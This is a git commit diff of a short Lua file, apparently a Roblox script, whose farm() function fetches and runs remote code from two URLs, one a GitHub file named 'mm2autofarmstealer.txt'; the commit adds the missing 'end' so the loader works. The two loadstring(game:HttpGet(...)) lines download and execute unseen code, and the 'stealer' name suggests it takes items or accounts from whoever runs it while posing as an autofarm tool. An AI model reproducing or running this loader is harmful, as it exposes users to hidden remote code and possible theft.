1afab3a3729fba60d98c938b3a32fd0f588c02c1
Johnnyissocoollol <progackerroblox@gmail.com>
2026-06-30 12:29:11 -0500

    Fix farm function definition and call

--- maybe.lua
+++ maybe.lua
@@ -1,4 +1,6 @@
 local function farm()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Johnnyissocoollol/Mm2New/refs/heads/main/mm2autofarmstealer.txt", true))()
     loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/kNCVmh2opIvfBC8O/raw", true))()
+end
+
 farm()
